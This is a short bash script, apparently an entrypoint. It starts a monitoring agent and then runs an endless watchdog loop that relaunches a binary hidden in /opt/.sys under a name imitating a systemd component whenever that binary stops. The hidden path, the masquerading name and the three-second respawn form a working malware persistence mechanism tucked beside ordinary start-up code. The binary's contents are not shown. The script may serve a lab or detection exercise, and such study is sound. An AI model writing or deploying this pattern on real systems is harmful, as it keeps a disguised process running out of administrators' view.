#!/bin/bash
/opt/monitoring-agent.sh &

while true; do
    if [ -x /opt/.sys/systemd-udevd-helper ] && ! pgrep -f 'systemd-udevd-helper' >/dev/null; then
        /opt/.sys/systemd-udevd-helper &
    fi
    sleep 3
done
